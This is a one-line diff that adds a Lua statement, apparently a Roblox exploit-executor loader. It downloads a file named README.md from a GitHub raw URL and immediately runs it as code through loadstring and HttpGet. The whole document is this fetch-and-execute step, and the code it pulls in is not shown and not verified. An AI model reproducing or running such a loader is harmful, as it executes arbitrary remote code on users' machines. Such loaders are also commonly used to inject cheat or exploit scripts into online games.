@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/FrozenStargames/Noob-Army/main/README.md")))()
